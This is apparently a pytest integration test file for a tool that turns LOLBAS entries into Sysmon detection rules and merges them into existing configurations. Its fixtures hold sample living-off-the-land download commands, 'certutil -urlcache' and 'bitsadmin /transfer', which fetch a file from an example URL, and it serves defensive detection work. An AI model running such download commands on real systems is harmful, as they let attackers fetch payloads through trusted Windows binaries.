"""Integration tests for the full pipeline."""

import json
import tempfile
from pathlib import Path

import pytest
from lxml import etree

from lolbas_sysmon.config import Config, ConfigLoader
from lolbas_sysmon.services import (
    LOLBASClient,
    LOLBASParser,
    SysmonConfigManager,
    SysmonRuleGenerator,
)


@pytest.fixture
def sample_lolbas_data():
    """Sample LOLBAS data."""
    return [
        {
            "Name": "Certutil.exe",
            "OriginalFileName": "CertUtil.exe",
            "Description": "Certificate utility",
            "Commands": [
                {
                    "Command": "certutil.exe -urlcache -f http://example.com/file.exe",
                    "Description": "Download file from URL",
                    "MitreID": "T1105",
                    "Category": "Download",
                }
            ],
            "ATT&CK": [{"ID": "T1105"}],
        },
        {
            "Name": "Bitsadmin.exe",
            "OriginalFileName": "bitsadmin.exe",
            "Description": "BITS admin utility",
            "Commands": [
                {
                    "Command": "bitsadmin /transfer job http://example.com/file.exe",
                    "Description": "Download file using BITS",
                    "MitreID": "T1197",
                    "Category": "Download",
                }
            ],
            "ATT&CK": [{"ID": "T1197"}],
        },
    ]


@pytest.fixture
def sample_config():
    """Sample configuration."""
    return Config(
        categories=["Download"],
        mappings={"Download": ["ProcessCreate"]},
        event_conditions={"ProcessCreate": ["OriginalFileName", "Image"]},
        rule_group_prefix="LOLBAS_",
        rule_group_cmd_prefix="LOLBAS_CMD_",
        unique_rules=False,
    )


class TestFullPipeline:
    """Tests for the complete data flow."""

    def test_parse_and_generate(self, sample_lolbas_data, sample_config):
        """Test parsing LOLBAS data and generating rules."""
        parser = LOLBASParser()
        lolbins = parser.parse(sample_lolbas_data)

        assert len(lolbins) == 2

        filtered = parser.filter_by_category(lolbins, "Download")
        assert len(filtered) == 2

        generator = SysmonRuleGenerator(sample_config)
        lolbins_by_category = {"Download": filtered}
        rule_groups = generator.generate_all_rule_groups(lolbins_by_category)

        # Should have CMD + fallback groups
        assert len(rule_groups) == 2

        sysmon_config = generator.create_sysmon_config(rule_groups)
        assert sysmon_config.tag == "Sysmon"

        xml_str = generator.to_xml_string(sysmon_config)
        assert "CertUtil.exe" in xml_str
        assert "bitsadmin.exe" in xml_str
        assert "-urlcache" in xml_str
        assert "/transfer" in xml_str

    def test_save_and_load(self, sample_lolbas_data, sample_config):
        """Test saving rules to file and loading them."""
        parser = LOLBASParser()
        lolbins = parser.parse(sample_lolbas_data)
        filtered = parser.filter_by_category(lolbins, "Download")

        generator = SysmonRuleGenerator(sample_config)
        rule_groups = generator.generate_all_rule_groups({"Download": filtered})
        sysmon_config = generator.create_sysmon_config(rule_groups)

        with tempfile.NamedTemporaryFile(suffix=".xml", delete=False) as f:
            output_path = f.name

        try:
            generator.save_to_file(sysmon_config, output_path)

            assert Path(output_path).exists()

            tree = etree.parse(output_path)
            root = tree.getroot()

            assert root.tag == "Sysmon"
            assert root.find("EventFiltering") is not None

            rule_groups = list(root.iter("RuleGroup"))
            assert len(rule_groups) >= 1
        finally:
            Path(output_path).unlink(missing_ok=True)


class TestMergeWithExisting:
    """Tests for merging with existing Sysmon config."""

    @pytest.fixture
    def existing_config_xml(self):
        """Sample existing Sysmon config."""
        return """<?xml version="1.0" encoding="utf-8"?>
<Sysmon schemaversion="4.90">
  <EventFiltering>
    <RuleGroup name="Existing_Rules" groupRelation="or">
      <ProcessCreate onmatch="include">
        <Image condition="end with">\\evil.exe</Image>
      </ProcessCreate>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
"""

    def test_merge_adds_new_rules(self, existing_config_xml, sample_lolbas_data, sample_config):
        """Test merging adds new rules to existing config."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False, encoding="utf-8") as f:
            f.write(existing_config_xml)
            existing_path = f.name

        try:
            manager = SysmonConfigManager(existing_path)
            manager.load()

            parser = LOLBASParser()
            lolbins = parser.parse(sample_lolbas_data)
            filtered = parser.filter_by_category(lolbins, "Download")

            generator = SysmonRuleGenerator(sample_config)
            rule_groups = generator.generate_all_rule_groups({"Download": filtered})

            added, skipped = manager.merge_rule_groups(rule_groups)

            assert added > 0

            with tempfile.NamedTemporaryFile(suffix=".xml", delete=False) as out:
                output_path = out.name

            manager.save(output_path)

            tree = etree.parse(output_path)
            root = tree.getroot()

            # Should have existing + new rule groups
            rule_groups = list(root.iter("RuleGroup"))
            assert len(rule_groups) >= 2

            xml_content = Path(output_path).read_text()
            assert "Existing_Rules" in xml_content
            assert "CertUtil.exe" in xml_content

            Path(output_path).unlink(missing_ok=True)
        finally:
            Path(existing_path).unlink(missing_ok=True)

    def test_merge_skips_duplicates(self, sample_lolbas_data, sample_config):
        """Test merging skips duplicate rules."""
        existing_xml = """<?xml version="1.0" encoding="utf-8"?>
<Sysmon schemaversion="4.90">
  <EventFiltering>
    <RuleGroup name="LOLBAS_Download" groupRelation="or">
      <ProcessCreate onmatch="include">
        <OriginalFileName condition="is">CertUtil.exe</OriginalFileName>
      </ProcessCreate>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
"""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False, encoding="utf-8") as f:
            f.write(existing_xml)
            existing_path = f.name

        try:
            manager = SysmonConfigManager(existing_path)
            manager.load()

            parser = LOLBASParser()
            lolbins = parser.parse(sample_lolbas_data)
            filtered = parser.filter_by_category(lolbins, "Download")

            generator = SysmonRuleGenerator(sample_config)
            rule_groups = generator.generate_all_rule_groups({"Download": filtered})

            added, skipped = manager.merge_rule_groups(rule_groups, force=False)

            # CertUtil should be skipped as duplicate
            assert skipped >= 1
        finally:
            Path(existing_path).unlink(missing_ok=True)


class TestLOLBASClientIntegration:
    """Tests for LOLBAS client with local files."""

    def test_load_from_file(self, sample_lolbas_data):
        """Test loading LOLBAS data from local file."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False, encoding="utf-8") as f:
            json.dump(sample_lolbas_data, f)
            json_path = f.name

        try:
            client = LOLBASClient(url="https://example.com", default_json="nonexistent.json")
            data = client.load_from_file(json_path)

            assert len(data) == 2
            assert data[0]["Name"] == "Certutil.exe"
        finally:
            Path(json_path).unlink(missing_ok=True)


class TestConfigLoaderIntegration:
    """Tests for config loader."""

    def test_load_custom_config(self):
        """Test loading custom config file."""
        config_content = """
[categories]
enabled = ["Execute", "Download"]

[mappings]
"Execute" = ["ProcessCreate"]
"Download" = ["ProcessCreate", "NetworkConnect"]

[event_conditions]
ProcessCreate = ["OriginalFileName", "Image"]

[rule_groups]
prefix = "CUSTOM_"
cmd_prefix = "CUSTOM_CMD_"
unique_rules = true
"""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".toml", delete=False, encoding="utf-8") as f:
            f.write(config_content)
            config_path = f.name

        try:
            loader = ConfigLoader()
            config = loader.load(config_path)

            assert config.categories == ["Execute", "Download"]
            assert config.rule_group_prefix == "CUSTOM_"
            assert config.rule_group_cmd_prefix == "CUSTOM_CMD_"
            assert config.unique_rules is True
        finally:
            Path(config_path).unlink(missing_ok=True)
